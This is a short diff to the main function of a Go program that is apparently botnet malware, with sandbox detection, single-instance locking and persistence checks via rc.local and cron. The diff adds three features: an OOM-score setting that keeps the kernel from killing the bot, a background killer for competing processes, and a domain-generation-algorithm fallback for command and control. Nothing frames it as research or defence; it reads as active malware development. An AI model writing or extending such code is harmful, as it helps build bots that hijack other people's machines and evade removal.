@@ -282,6 +282,9 @@ func main() {
 	// Parent exits here; only the daemon child continues past this point.
 	stuxnet()
 
+	// Set OOM score to -1000 so kernel never kills the bot under memory pressure
+	setOOMScore()
+
 	deoxys("main: Bot starting up...")
 	deoxys("main: Protocol version: %s", buildTag)
 	if winnti() {
@@ -294,7 +297,15 @@ func main() {
 	}
 	deoxys("main: No sandbox detected, continuing")
 	revilSingleInstance()
+
+	// Start competitor process killer daemon in background
+	lazarusKillerStart()
+
+	// Initialize DGA fallback domain list
+	zeusDGAInit()
+
 	deoxys("main: Running persistence check (rc.local)...")
+
 	hRpCwZt()
 	deoxys("main: rc.local persistence check complete")
 	deoxys("main: Running persistence check (cron)...")
